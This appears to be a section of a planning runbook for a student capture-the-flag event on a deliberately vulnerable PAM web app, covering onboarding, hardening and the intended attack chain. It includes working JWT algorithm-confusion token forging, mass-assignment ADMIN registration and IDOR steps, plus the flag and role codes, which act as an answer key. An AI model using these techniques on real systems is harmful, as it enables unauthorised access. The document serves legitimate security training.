### Purpose

Create all ~20–24 crew accounts before the event. Accounts are seeded into the `lore_players` table (isolated auth, separate from the CTF-PAM SecureGate/PAM Postgres `users` table) and delivered via a themed email — this email now hands over a **crew login**, not PAM credentials.

### Step 1 — Google Form

Create a Google Form at least one week before the event:
- Fields: Full Name, Email Address, Preferred CTF Username
- Responses go to a Google Sheet
- Export the sheet as `participants.csv` the day before the event

CSV format expected:
```
name,email,username
Alice Tanveer,alice@student.comsats.edu.pk,0xAlice
Bob Rafiq,bob@student.comsats.edu.pk,n3tw0rkBob
...
```

### Step 2 — Bulk Crew Account Creation Script (`ctf-ops/onboarding/bulk-create-users.ts`)

This script reads `participants.csv`, generates a random password for each participant, and inserts directly into the `lore_players` table (or calls an internal-only crew-account creation route on the CTF-PAM server, once Section 18A's auth routes exist) — **not** `/api/users/admin`, which is the SecureGate/PAM admin route and has nothing to do with crew accounts anymore.

```typescript
import { parse } from 'csv-parse/sync';
import { randomBytes } from 'crypto';
import { readFileSync, writeFileSync } from 'fs';

// Internal-only route — must NOT be reachable by players, and must be
// entirely separate from anything under /api/register or /api/users/admin
const CREW_ONBOARDING_URL = process.env.CREW_ONBOARDING_URL ?? 'http://pam-ctf.duckdns.org/api/internal/crew-accounts';
const ONBOARDING_KEY = process.env.CREW_ONBOARDING_KEY ?? ''; // shared secret, not a player-facing JWT

interface Participant { name: string; email: string; username: string }

async function main() {
  const csv = readFileSync('./participants.csv', 'utf8');
  const participants: Participant[] = parse(csv, { columns: true, skip_empty_lines: true });

  const credentials: string[] = ['name,email,password,crew_login_url'];

  for (const p of participants) {
    const password = randomBytes(8).toString('hex');

    const res = await fetch(CREW_ONBOARDING_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Onboarding-Key': ONBOARDING_KEY,
      },
      body: JSON.stringify({ email: p.email, password }),
      // Note: no `role` or `clearanceCode` field at all — lore_players
      // has no concept of PAM roles, it's a completely separate table
    });

    if (!res.ok) {
      const err = await res.json();
      console.error(`Failed to create crew account for ${p.email}:`, err.message);
      continue;
    }

    credentials.push(`${p.name},${p.email},${password},<lore-site-url>`);
    console.log(`Created crew account: ${p.email}`);
    await new Promise(r => setTimeout(r, 200));
  }

  writeFileSync('./credentials.csv', credentials.join('\n'));
  console.log('Done. Crew credentials saved to credentials.csv');
}

main().catch(console.error);
```

> [!important] `lore_players` table + this onboarding route are not yet built
> This is a dependency, not just a code sketch — see Section 18A and the Open Items list in Section 23. The route above (`/api/internal/crew-accounts`) doesn't exist yet and needs its own guard (shared secret, not exposed to players) distinct from every player-facing route in this document.

### Step 3 — Email Template (`email-template.html`)

```html
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <style>
    body   { font-family: 'Courier New', monospace; background: #0d0d0d; color: #c8c8c8; padding: 24px; }
    .card  { max-width: 520px; margin: auto; border: 1px solid #333; padding: 32px; border-radius: 8px; }
    h1     { color: #00ff88; font-size: 1.2rem; margin-bottom: 16px; }
    .cred  { background: #1a1a1a; padding: 16px; border-radius: 4px; margin: 12px 0; }
    .label { color: #666; font-size: 0.8rem; }
    .value { color: #00ff88; font-size: 1rem; margin: 4px 0 12px; }
    .note  { font-size: 0.8rem; color: #666; margin-top: 24px; }
  </style>
</head>
<body>
  <div class="card">
    <h1>// Crew Access — Do Not Forward</h1>
    <p>You're in. Recruitment window opens at <strong>{{EVENT_TIME}}</strong>. This is your crew login — nothing else. What happens after you sign in is on you.</p>

    <div class="cred">
      <div class="label">CREW LOGIN</div>
      <div class="value">{{EMAIL}}</div>
      <div class="label">PASSWORD</div>
      <div class="value">{{PASSWORD}}</div>
    </div>

    <p>Start here: <strong>{{LORE_SITE_URL}}</strong></p>
    <p>Crew channel for updates: <strong>{{DISCORD_INVITE}}</strong></p>

    <p class="note">
      This is not a PAM login — you'll find that yourself.<br>
      Stay in scope. Nothing outside the target domains listed on the crew dashboard.
    </p>
  </div>
</body>
</html>
```

### Step 4 — Send Emails (`send-emails.ts`)

Use Nodemailer with a Gmail app password or any SMTP provider:

```typescript
import nodemailer from 'nodemailer';
import { parse }  from 'csv-parse/sync';
import { readFileSync } from 'fs';

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.SMTP_USER,
    pass: process.env.SMTP_PASS, // App password, not account password
  },
});

const template = readFileSync('./email-template.html', 'utf8');
const creds = parse(readFileSync('./credentials.csv', 'utf8'), {
  columns: true, skip_empty_lines: true
});

for (const c of creds) {
  const html = template
    .replace('{{EMAIL}}',          c.email)
    .replace('{{PASSWORD}}',       c.password)
    .replace('{{EVENT_TIME}}',     'Saturday 14:00 PKT')
    .replace('{{LORE_SITE_URL}}',  '<lore-site-url>')
    .replace('{{DISCORD_INVITE}}', 'https://discord.gg/<your-invite>');

  await transporter.sendMail({
    from:    '"unknown sender" <noreply@yourdomain.com>',
    to:      c.email,
    subject: '[crew access] read this before Saturday',
    html,
  });

  console.log(`Sent to ${c.email}`);
  await new Promise(r => setTimeout(r, 500)); // avoid spam filters
}
```

### Phase 4 Deliverables

- [ ] Google Form published and shared with all participants
- [ ] `participants.csv` collected the day before the event
- [ ] `lore_players` table + internal onboarding route built (Section 18A dependency — not yet done)
- [ ] `bulk-create-users.ts` run — all ~20–24 **crew** accounts exist in `lore_players`, none in the PAM `users` table
- [ ] `credentials.csv` generated and stored securely (not committed to git)
- [ ] All crew-access emails sent successfully
- [ ] Test login verified: one credential from the CSV reaches the dashboard, and confirms **no** PAM access exists yet from that account

---

## 14. Phase 5 — Hardening, Isolation & Security Groups (Member 3)

### Purpose

Before the event goes live, lock down everything that should not be reachable. The CTF PAM being intentionally vulnerable does not mean the team's SSH access or the Production PAM should also be at risk.

### Step 1 — Lock SSH on All EC2s

By default, SSH is open to `0.0.0.0/0` in early development. Before the event, SSH inbound must be restricted to **only team members' current IP addresses**. Each team member updates the Security Group with their current home IP.

If team members have dynamic ISP IPs, use a VPN with a static exit IP or update the rules on event day.

```bash
# Example: add your current IP to SG-CTF-PAM port 22 inbound via AWS CLI
aws ec2 authorize-security-group-ingress \
  --group-id sg-<id> \
  --protocol tcp \
  --port 22 \
  --cidr $(curl -s https://checkip.amazonaws.com)/32
```

### Step 2 — Verify CTF-MySQL is Unreachable from Internet

```bash
# From your laptop — this should FAIL
ssh ubuntu@10.0.1.50  # Private IP — no route from internet

# From CTF-PAM EC2 — this should SUCCEED
ssh -i /path/to/ctf_pam_key pamuser@10.0.1.50
```

If the first test succeeds, the private subnet routing is misconfigured — fix it before going live.

### Step 3 — Confirm No Network Path: CTF → Production

```bash
# From CTF-PAM EC2 — this must FAIL and TIMEOUT
# (it should never even get a connection refused — the packets must not route)
curl --max-time 5 http://securepamgate.duckdns.org/api/assets
# Expected: curl: (28) Connection timed out

# Also test private IPs if on same VPC (should be in different security groups with no cross-rule)
```

### Step 4 — Disable CTF-MySQL Direct Internet Access

Confirm no route from CTF-MySQL to the internet:

```bash
# On CTF-MySQL EC2 (via jump host)
curl --max-time 5 https://google.com
# Expected: curl: (28) Connection timed out
```

If it connects, the private subnet has an unintended NAT gateway — remove it.

### Step 5 — Set Up UFW on CTF-MySQL EC2

```bash
# On CTF-MySQL EC2
sudo ufw default deny incoming
sudo ufw default deny outgoing
sudo ufw allow in from 10.0.0.0/24 to any port 22   # SSH from public subnet (CTF-PAM)
sudo ufw allow in from 10.0.0.0/24 to any port 3306  # MySQL from public subnet
sudo ufw enable
sudo ufw status verbose
```

### Step 6 — Create EC2 Snapshots (Backup Before Event)

```bash
# Via AWS Console: EC2 → Instances → each instance → Actions → Image and templates → Create image
# Create AMIs named:
#   CTF-PAM-backup-<date>
#   CTF-MySQL-backup-<date>
#   Lore-Nginx-backup-<date>

# If anything goes catastrophically wrong during the event, restore from these AMIs in minutes
```

### Step 7 — Add Nginx Rate Limiting on CTF-PAM

Prevent players from hammering the API with brute-force requests:

```nginx
# Add to the http block in /etc/nginx/nginx.conf
limit_req_zone $binary_remote_addr zone=ctf_api:10m rate=30r/m;

# Add to the location block in ctf-pam.conf
location /api/ {
    limit_req zone=ctf_api burst=10 nodelay;
    proxy_pass http://localhost:3000;
    ...
}
```

### Phase 5 Deliverables

- [ ] SSH inbound on all Security Groups restricted to team IPs only
- [ ] CTF-MySQL EC2 is unreachable directly from the internet (confirmed)
- [ ] No network path from CTF-PAM to Production PAM (confirmed with timeout test)
- [ ] UFW enabled on CTF-MySQL with deny-all defaults
- [ ] AMI snapshots created for all three CTF EC2s
- [ ] Nginx rate limiting active on CTF-PAM API routes
- [ ] Full attack chain test run by one team member from scratch: confirms the attack works but also that nothing outside the intended scope is reachable

---

## 15. Phase 6 — Integration Testing & Attack Walkthroughs (All)

### Purpose

Every team member must run through the **complete attack chain** from scratch — starting with only the lore page URL and the participant credentials — and verify each stage works as designed. If a team member cannot complete a stage within a reasonable time, the stage is either too hard or broken.

### The Full Walkthrough Test

Run this test exactly as a participant would. Do not use insider knowledge of the system. Use only publicly available tools.

**Environment:** A browser + terminal. No special tools pre-installed beyond curl and Python.

---

**Stage 1 Walkthrough Test:**

```bash
# Test 1: Framework discovery from headers
curl -I http://ctf-pam.duckdns.org
# Expected output includes: X-Powered-By: Next.js
# And: Server: nginx/1.24.0

# Test 2: Certificate transparency
# Visit https://crt.sh/?q=duckdns.org in browser
# Search for ctf-pam — certificate should appear
```

Expected: Both work. If `X-Powered-By` is missing, Nginx is incorrectly stripping it — check the config.

---

**Stage 2 Walkthrough Test (Algorithm Confusion path):**

```bash
# Log in with participant credentials
TOKEN=$(curl -s -X POST http://ctf-pam.duckdns.org/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@student.edu","password":"<test-password>"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['accessToken'])")

echo $TOKEN
# Decode payload (middle segment)
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool

# Fetch JWKS
curl -s http://ctf-pam.duckdns.org/.well-known/jwks.json | python3 -m json.tool

# Now craft forged HS256 token (Python script — players would write this):
python3 << 'EOF'
import jwt, base64, json, re
import requests

# Get public key
jwks = requests.get('http://ctf-pam.duckdns.org/.well-known/jwks.json').json()
# Extract the PEM from the JWKS (players use a JWKS-to-PEM converter)
# Then sign with HS256 using the PEM bytes as the secret

from cryptography.hazmat.primitives.serialization import load_pem_public_key
pem = b"""-----BEGIN PUBLIC KEY-----
<paste n and e values converted to PEM>
-----END PUBLIC KEY-----"""

forged = jwt.encode(
    {"userId": "any-id", "role": "ADMIN", "email": "admin@evil.com"},
    pem,
    algorithm="HS256"
)
print("Forged token:", forged)

# Test it
res = requests.get(
    'http://ctf-pam.duckdns.org/api/assets',
    headers={"Authorization": f"Bearer {forged}"}
)
print("Status:", res.status_code)
print("Body:", res.json())
EOF
```

Expected: `GET /api/assets` with forged token returns the MySQL asset.

---

**Stage 3 Walkthrough Test (Mass Assignment path):**

```bash
# Register a new ADMIN account via the vulnerable endpoint
curl -s -X POST http://ctf-pam.duckdns.org/api/register \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com","password":"p@ssw0rd123","role":"ADMIN"}' \
  | python3 -m json.tool

# Log in with the new account
ADMIN_TOKEN=$(curl -s -X POST http://ctf-pam.duckdns.org/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com","password":"p@ssw0rd123"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['accessToken'])")

# Request a session
curl -s -X POST http://ctf-pam.duckdns.org/api/sessions/request \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -d '{"assetId":"00000000-0000-0000-0000-000000000001"}' \
  | python3 -m json.tool
```

Expected: A JIT ticket is returned with a 60-second window.

---

**Stage 4 Walkthrough Test:**

Open the browser. Navigate to `http://ctf-pam.duckdns.org/terminal?ticket=<uuid>`.

In the terminal:

```sql
show databases;
use secret_ops;
show tables;
select * from flag;
-- Expected: CTF{jwt_alg_confusion_pam_pwned_2025}
```

Navigate to `http://apt-lore.duckdns.org/submit.html`. Enter email and flag. Check leaderboard updates.

---

### Integration Attack Checklist

```
STAGE 1 — RECON
─────────────────────────────────────────────────────────────────
□ 1. curl -I returns X-Powered-By: Next.js
□ 2. curl -I returns Server: nginx/x.x.x
□ 3. crt.sh shows ctf-pam.duckdns.org certificate
□ 4. X-Challenge-Platform: SecureGate-PAM on apt-lore.duckdns.org

STAGE 2 — WEB EXPLOITATION
─────────────────────────────────────────────────────────────────
□ 5. /.well-known/jwks.json returns RSA public key in JWKS format
□ 6. HS256 forged token with ADMIN role is accepted by /api/assets
□ 7. /api/audit/sessions/user/<other-uid> returns another user's sessions (IDOR)
□ 8. Both attacks independently produce ADMIN-level access

STAGE 3 — PRIVILEGE ESCALATION
─────────────────────────────────────────────────────────────────
□ 9.  POST /api/register with role:"ADMIN" creates an admin account
□ 10. The new admin can log in and receive a real ADMIN JWT
□ 11. Admin JWT accepted at /api/sessions/request
□ 12. JIT ticket issued for the MySQL asset

STAGE 4 — FLAG RETRIEVAL
─────────────────────────────────────────────────────────────────
□ 13. Terminal opens successfully — pamuser restricted shell → MySQL
□ 14. show databases; shows employees, hr_archive, financial_records, secret_ops
□ 15. select * from flag; returns CTF{jwt_alg_confusion_pam_pwned_2025}
□ 16. Flag submission at apt-lore.duckdns.org/submit.html returns correct: true
□ 17. Leaderboard updates within 10 seconds

ISOLATION CHECKS
─────────────────────────────────────────────────────────────────
□ 18. SSH from internet to CTF-MySQL private IP: FAILS
□ 19. curl from CTF-MySQL to internet: FAILS (TIMEOUT)
□ 20. curl from CTF-PAM to securepamgate.duckdns.org: FAILS (TIMEOUT)
□ 21. pamuser cannot exit MySQL and access bash: CONFIRMED
□ 22. Using a participant credential, /api/users/admin returns 403: CONFIRMED
```

---

## 16. Full Attack Chain — Step by Step

This is the complete attack path from start to flag, as a player would experience it under the current (self-registration) design. Path B (mass assignment, OSINT-chained) is shown for Stage 2 since it's the fuller path — Path A (algorithm confusion) is a shortcut that skips straight from Stage 1 to "has ADMIN," bypassing Stage 0/2B entirely, and is shown separately below.

```
═══════════════════════════════════════════════════════════════════════════════
STAGE 0 — FOOTHOLD (new)
═══════════════════════════════════════════════════════════════════════════════

Player                        lore site                     pam-ctf.duckdns.org
───────                       ─────────                     ────────────────────

Signs into crew dashboard ──► lore_players session established
                               (Section 18A — this identity is
                               what scoring is actually built on)

Reads Lore tab to the end ──► Gets pam-ctf.duckdns.org URL
                               No PAM credentials, no hints
                               about endpoints — just the URL

Visits pam-ctf.duckdns.org ─────────────────────────────────► Login page only.
                                                                No register link anywhere.

Fuzzes /api/* ───────────────────────────────────────────────► Finds POST /api/register
  (ffuf / gobuster)

Sends POST /api/register ─────────────────────────────────────► clearanceCode missing/unknown
  { email: "me@evil.com",                                       → silent fallback to OPERATOR
    password: "pass123" }                                       Account created
                                    ◄──────────────────────────  { message: "Account created" }

Player now has:
  ✓ A real, self-created OPERATOR PAM account (worth partial points)
  ✓ No MySQL asset visibility (access_policies row removed for OPERATOR)
  ✓ A stopping point — needs either OSINT (2B) or prior JWT knowledge (2A) to go further


═══════════════════════════════════════════════════════════════════════════════
STAGE 1 — RECON
═══════════════════════════════════════════════════════════════════════════════

curl -I pam-ctf.duckdns.org ──────────────────────────────► Nginx responds
                                                             X-Powered-By: Next.js ◄──
                                                             Server: nginx/x.x.x ◄──

Visit crt.sh ─────────────► Public CT logs show certificate
                             for pam-ctf.duckdns.org

Player now knows:
  ✓ Target runs Next.js on Nginx
  ✓ Domain confirmed via CT logs
  ✓ Enough to pull /.well-known/jwks.json for Stage 2A


═══════════════════════════════════════════════════════════════════════════════
STAGE 2, PATH B — MASS ASSIGNMENT, CHAINED WITH OSINT
═══════════════════════════════════════════════════════════════════════════════

Opens Hints/Intel tab ──────► Sees a vague pointer, not an answer
                               (Section 17A — never hints at technique)

Follows OSINT chain:
  Hints tab → leaked memo → leak page (fragment-based, not linked)
  → provisioning runbook found

Runbook reveals ────────────► PROV-STANDARD → OPERATOR
                               PROV-AUDIT    → AUDITOR
                               PROV-ROOT     → ADMIN

Sends POST /api/register ─────────────────────────────────────► clearanceCode recognized
  { email: "crew2@evil.com",                                    → finalRole = ADMIN
    password: "pass123",
    clearanceCode: "PROV-ROOT" } ─────────────────────────────► Account created
                                    ◄──────────────────────────  { message: "Account created" }

Logs in with new account ────── POST /api/auth/login ───────► Finds user in DB
                                                                User has ADMIN role
                                    ◄──────────────────────── Real RS256 ADMIN JWT returned

Requests session ──────────────  POST /api/sessions/request ► Checks access_policy
  { assetId: "00000000-..." }                                 ADMIN has policy for MySQL asset
                                    ◄──────────────────────── { ticket, expiresAt }

Player now has:
  ✓ Legitimate ADMIN credentials (earned, not forged)
  ✓ JIT ticket for MySQL asset (60 second window)
  ✓ Must connect WebSocket within 60 seconds

[Shortcut — STAGE 2, PATH A instead: skip the OSINT chain above entirely.
 Take the Stage-0 OPERATOR token, pull the public key from /.well-known/jwks.json,
 forge an HS256 token with { role: "ADMIN" }, and go straight to
 "Requests session" above with the forged token. No hints exist for this path.]


═══════════════════════════════════════════════════════════════════════════════
STAGE 3 — FLAG RETRIEVAL
═══════════════════════════════════════════════════════════════════════════════

Navigates to /terminal?ticket=<uuid>

WebSocket connects ────────────  server.ts GETDEL ticket
                                 Ticket valid → open tunnel

                                 tunnelService.openTunnel()
                                   → Query asset_credentials
                                   → AES-256-GCM decrypt
                                   → ssh2 connects to CTF-MySQL EC2
                                   → Uses pamuser ed25519 key
                                   → PTY shell opens
                                   → Shell is /usr/local/bin/pamshell.sh
                                   → MySQL launches automatically

Browser terminal shows ─────────────────────────────────────────────────────────
  mysql>

Player types: show databases;
  → employees, hr_archive, financial_records, secret_ops

Player types: use secret_ops; show tables;
  → project_codenames, access_tokens, flag

Player types: select * from flag;
  → CTF{...}

Returns to crew dashboard → Scoreboard/Submit tab
Submits flag ────────────────────────────────────────────────────────────────►
  (email comes from the verified lore_players session,           POST /api/ctf/submit
   NOT typed into a free-text field — Section 18A)                Flag matches ✓
                                                                    Score recorded, tied to
                                                                    verified crew identity
                                    ◄─────────────────────────── { correct: true }

Scoreboard updates ─────────── GET /api/ctf/scores (polled from dashboard)
                                  ◄── Player appears on board, correctly attributed
```

---

## 17. Vulnerability Design Explained

### Why These Vulnerabilities?

Each vulnerability was chosen because it is documented in real-world security research, appears in OWASP Top 10 or CWE, and has caused real breaches in production systems.

**Mass Assignment via Unlinked Registration (Stage 0)**

An unauthenticated, unlinked-from-frontend registration endpoint is a common real-world finding — "left open during development" endpoints are one of the most frequent findings in bug bounty triage. This stage exists specifically to make endpoint fuzzing a required skill, not an optional one, since no URL is handed out this time.

**JWT Algorithm Confusion (Stage 2, Path A)**

This vulnerability class was documented and weaponised by security researcher PortSwigger and appears in multiple real bug bounty reports. The root cause is a design flaw in how some JWT libraries handle the `alg` field from the token header — they allow the client to dictate the verification algorithm. The HS256/RS256 variant specifically exploits the fact that if a server has an RSA public key, and the server will accept HS256, the attacker can use the public key as the HMAC secret (because both sides are using the same bytes — the attacker signs with them, the server verifies with them).

**Mass Assignment via `clearanceCode` (Stage 2, Path B)**

Mass assignment vulnerabilities occur when an API blindly uses client-supplied fields to set object properties — including properties that should only be set server-side. This variant deliberately renames the field and obfuscates the values (`PROV-ROOT` rather than `"role":"ADMIN"`) specifically so the underlying trust bug is not directly guessable — it has to be chained with the OSINT-planted provisioning runbook (Section 17A) to be exploitable. This vulnerability class affected GitHub in 2012 (allowing users to add their SSH key to any repository) and remains a common finding in bug bounty programs today.

**IDOR on Audit Endpoint (Stage 2, side-track)**

Insecure Direct Object References are OWASP API Top 10 territory (broken object level authorisation). The vulnerability is simple: the system authenticates the user but does not authorise whether they are allowed to access the specific resource they asked for. Any authenticated player can substitute another user's UUID into the URL and see their sessions — but doing anything useful with it requires a UUID they don't already have, which is why it's chained to OSINT rather than solvable through the endpoint alone.

**Restricted Shell Bypass Mitigation (Stage 3 Defence)**

The restricted shell for `pamuser` is not a vulnerability — it is a defence that prevents players from going beyond the intended scope. It teaches an important lesson: even when PAM access is compromised, good system design limits the blast radius. The `pamuser` account can query databases but cannot read `/etc/shadow`, modify system files, or pivot elsewhere.

### Vulnerability Severity Calibration

The vulnerabilities are ordered by discovery difficulty, not by CVSS score:

| Stage | Vulnerability | Real-world CVSS | Discovery Difficulty |
|---|---|---|---|
| 0 | Unlinked registration endpoint | Medium (5.0–6.5) | Low–Medium — requires fuzzing, not just header-reading |
| 2A | JWT Algorithm Confusion | High (7.5–9.0) | Medium — requires knowing JWT internals; no OSINT hint by design |
| 2B | Mass Assignment (`clearanceCode`) | High (8.0+) | Medium–High — requires the full OSINT chain, not just endpoint discovery |
| 2, side-track | IDOR | Medium–High (6.5–8.0) | Low technically, but gated entirely behind OSINT for payoff |
| Overall chain | All combined | Critical | Hard — requires chaining recon, fuzzing, and OSINT together |

---

## 17A. OSINT Chain Design

> [!important] This section is the OSINT partner's primary spec
> Every technical vulnerability in this document (except Path A, intentionally) is paired with a chained OSINT thread that a player must follow to actually exploit it. This section defines the rule the chain follows, the breadcrumb mechanism, and a table of what needs to be built.

### Core Rule
**Never hint at technique. Hint at a location or identifier.** A hint that says "try HS256/RS256 confusion" is a tutorial, not a puzzle. A hint that surfaces a partial UUID, a field name inside a leaked doc, or a path fragment rewards recognition and research — the player still has to supply the technique themselves. This rule applies to every breadcrumb below without exception.

### The Hints/Intel Tab
A dedicated tab in the crew dashboard (Section 2, delivery step 4 — name TBD, see Section 8: "Hints," "Intel," "Dead Drops," "Recon Log" are candidates) acts as the **entry point** for every OSINT thread, not the answer key. Each vulnerability gets a breadcrumb here that starts a chain living *outside* the dashboard (external pages, planted documents, image metadata, etc.). It should feel like a case board, not a walkthrough.

### One Chain Per Vulnerability

| Vulnerability | Breadcrumb in Hints tab | External chain | Payoff |
|---|---|---|---|
| Stage 2B — Mass assignment (`clearanceCode` mapping) | Reference to "the old onboarding paperwork" or similar, pointing outward | A planted **TASMOC provisioning runbook** (internal HR/IT doc styling) revealing `PROV-STANDARD → OPERATOR`, `PROV-AUDIT → AUDITOR`, `PROV-ROOT → ADMIN`. Should read like a boring internal doc, not a hint sheet. | Player registers directly as ADMIN via Path B |
| Stage 2, side-track — IDOR / admin UUID | Fragment of a UUID embedded in a "leaked internal chat" screenshot or similar | Split the UUID across 2–3 artifacts requiring different skills: one in image EXIF/alt-text, one in a fake Slack-export screenshot mid-conversation, optionally one behind a light geolocation clue | Enough of the admin UUID for the IDOR endpoint to return something meaningful |
| Stage 2A — JWT alg confusion | **Intentionally none** by default; at most a throwaway "engineering blog" mention that TASMOC "still supports both RS256 and HS256 for backward compatibility during a JWT migration," stated as mundane, never as a security warning | N/A — rewards players who already recognize the attack class | Confirms the target is vulnerable to a technique the player already suspected |
| Stage 0 — Finding `/api/register` | Optional light nudge only if event playtesting shows nobody finds it (e.g. a stray reference to "the old signup flow" in a leaked doc) — otherwise leave to pure fuzzing | N/A | Confirms the endpoint exists, doesn't reveal how to use it |
| Stage 1 — Recon | None needed — headers and JWKS are directly observable once players actually probe the target | N/A | Feeds Stage 0 and Stage 2A |

### The "Leak Page" Mechanic
Don't link to it. A dark-web-styled leak page should be **findable via a partial identifier or fragment**, not a clickable link from the dashboard — a direct link defeats the "hidden" framing. Concretely: the fake Slack screenshot (already doing double duty for the UUID fragment above) includes a visible-but-cropped mention like *"ugh, IT posted the whole onboarding doc to the leak mirror again"* with a partial paste-ID or URL fragment in the corner — enough to reconstruct or search for, not enough to click.

### Unifying Structure
Don't build disconnected lookup tables — one thread should lead to the next:

1. **Hints tab entry** → subtle pointer, not an answer
2. **A discoverable "leaked" internal memo/blog** → casually mentions the JWT dual-algorithm detail *and* references "the incident with IT's onboarding docs leaking again" (pointer to #3)
3. **The fake Slack-export leak page** (found via the fragment from #2) → contains the `clearanceCode → role` mapping table **and** UUID fragment(s), possibly one more UUID fragment in an attached image's EXIF data
4. Player now has independently-earned JWT recognition (if they already knew it), the mass-assignment mapping, and enough of the admin UUID to complete IDOR — all from one coherent "investigation," not four isolated puzzles

### Still to Draft (OSINT partner's next concrete deliverables)
- TASMOC provisioning runbook — actual document content
- Fake Slack-export leak page — screenshot/script content, plus exact UUID fragment placement
- Fake engineering blog post — JWT dual-algorithm mention (optional, low priority — Path A is meant to be hintless)
- Hints tab UI copy and name
- Ground-truth values must be pulled from Thebe (real `clearanceCode` values, real admin UUID once hardcoded — see Section 23) — never invent placeholder values that don't match the live deployment

---

## 18. Leaderboard & Scoring System

### Point Values

Scoring now needs to account for Stage 0 as a real achievement (it wasn't a stage before) and for the fact that Stage 2's two paths (A and B) are worth documenting separately even though both lead to the same place:

| Achievement | Points | How Detected |
|---|---|---|
| Self-registered a PAM account (Stage 0, blind OPERATOR) | 10 | First successful `/api/register` call for that PAM email |
| ADMIN-level API call made (either Path A or Path B) | 25 | Any call to ADMIN-only endpoint logged with a JWT for a user whose Postgres role disagrees, or a freshly-escalated account |
| JIT ticket issued | 50 | `POST /api/sessions/request` with ADMIN role succeeds |
| IDOR side-track completed | 15 (bonus, not required) | Successful `/api/audit/sessions/user/[uid]` call with a UUID that isn't the caller's own |
| Flag submitted correctly | 100 | `POST /api/ctf/submit` returns `correct: true` |

Tiebreaker: earliest timestamp for the highest-achieved stage. **Only the flag submission is authoritative for the public scoreboard** — see Section 18A for why the mid-chain achievements above are useful telemetry but not to be trusted or displayed as verified player progress.

### Score Detection Caveat — Read This Before Wiring Anything to the Scoreboard

> [!danger] Mid-chain achievements are keyed on PAM account email, which is not trustworthy identity
> Everything in the table above except "flag submitted" is detected by watching the **PAM** account (Postgres `users` table / JWT `email` claim). Under the new self-registration design, a player can register a PAM account with any email they want — `attacker@evil.com`, a joke name, or anything else. There's no cryptographic link between a PAM account and the real player behind it.
>
> **Do not build public leaderboard rows, rankings, or per-player progress bars off these events.** They're legitimate for internal `#alerts` telemetry (see Section 18A) — "someone just forged a JWT," "someone hit the mass-assignment endpoint" — but must never be presented to players as "you're at X points" unless the underlying event is the flag submission itself, which is the only stage tied to a verified `lore_players` session.

```typescript
// In the CTF fork of lib/rbac.ts — still useful for #alerts telemetry,
// just not for player-facing scoring:
if (allowedRoles.includes('ADMIN') && userRole === 'ADMIN') {
  setImmediate(() => {
    getAuditDb().then(db => db.collection('ctf_scores_events').insertOne({
      email: payload.email, // PAM email — unverified, telemetry only
      event: 'privilege_escalation_detected',
      timestamp: new Date(),
      endpoint: request.url,
    })).catch(() => {});
  });
}
```

### First Blood

The first player to submit the correct flag gets a Discord announcement. This must fire from `/api/ctf/submit` **after** that route is changed to read `email` from a verified `lore_players` session rather than the POST body (Section 18A) — otherwise "first blood" attribution has the same forgeability problem as everything else in this section.

```typescript
// In /api/ctf/submit/route.ts, after first correct submission:
// `email` here MUST come from the verified lore_players session, not request.body
const isFirstBlood = (await db.collection('ctf_scores').countDocuments()) === 1;
if (isFirstBlood) {
  await fetch(process.env.DISCORD_SOLVES_WEBHOOK_URL ?? '', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      content: `🩸 **FIRST BLOOD!** \`${email}\` has captured the flag!`,
    }),
  });
}
```

---

## 18A. Identity Architecture & Discord/Scoreboard Attribution

There are three separate identities in play now, and it's important to be explicit about which one is authoritative for what — this section resolves a real gap that existed once PAM credentials stopped being handed out.

| Identity | Where it lives | Purpose | Trustworthy for scoring? |
|---|---|---|---|
| Google Form roster | `ctf-ops/onboarding/participants.csv` | Real name, contact, prize distribution | Yes — ground truth for who the player actually is |
| Crew / lore-site account (`lore_players`) | New table on the CTF-PAM Node server, isolated JWT signing, separate from the SecureGate PAM `users` table | Dashboard login, Hints tab access, flag submission, scoreboard | **Yes — this is the identity scoring is built on** |
| PAM account | Self-registered via `/api/register` (Stage 0 vulnerability), lives in the CTF-PAM Postgres `users` table | The actual attack surface — arbitrary email, disposable, may be created multiple times per player | **No — never trust this for attribution** |

### Rule
Anything that touches the public scoreboard, first-blood detection, or player-facing announcements must be keyed off the `lore_players` session, never off a PAM account's email field. PAM email is flavor text an attacker chooses for themselves — treating it as identity is the same class of mistake as trusting a client-supplied `role` field, which is fittingly one of the vulnerabilities in this CTF.

### Required Backend Change
`app/api/ctf/submit/route.ts` currently reads `email` from the POST body, gated only by a shared `X-CTF-Submit-Key` header embedded in static HTML. This must change to pull `email` from a verified `lore_players` JWT/session instead. The shared-secret header can stay as a secondary guard, but it's not sufficient on its own once impersonation matters for a real scoreboard.

### Discord Channel Scoping

**`#alerts`** — unchanged from the original design (`recordSecurityEvent` in `lib/ctf-audit.ts`: brute force, rate limits, JWT forge, IDOR, mass assignment). Fires on PAM account email. Treat this as **ops telemetry only** — useful during the live event ("someone's fuzzing `/api/register` right now"), never as player identification.

**`#solves`/announcements** — must only fire from `/api/ctf/submit` once that route pulls `email` from a verified `lore_players` session per the change above. Once that's true, first-blood detection and the scoreboard are both trustworthy, because they're keyed to the Google-Form-backed identity, not the disposable PAM account.

**Mid-chain milestones** (`recon_first_login`, `privilege_escalation`, `session_requested`, `mysql_session_opened` in `lib/ctf-audit.ts`) — keep these as `#alerts`-only telemetry, explicitly **not** used for any player-facing progress tracking or leaderboard logic, since they're still keyed on unverifiable PAM email.

---

## 19. EC2 Instance Reference

A quick-reference table for all four EC2 instances. Fill in the actual values at setup time and store this in `ctf-ops/docs/infrastructure-notes.md` (never commit to git).

| Instance | Name Tag | Type | Public IP | Private IP | DuckDNS | SSH Key | Security Group |
|---|---|---|---|---|---|---|---|
| CTF-PAM | `CTF-PAM` | t2.micro | Dynamic | `10.0.0.x` | `ctf-pam.duckdns.org` | `ctf-team-key` | `SG-CTF-PAM` |
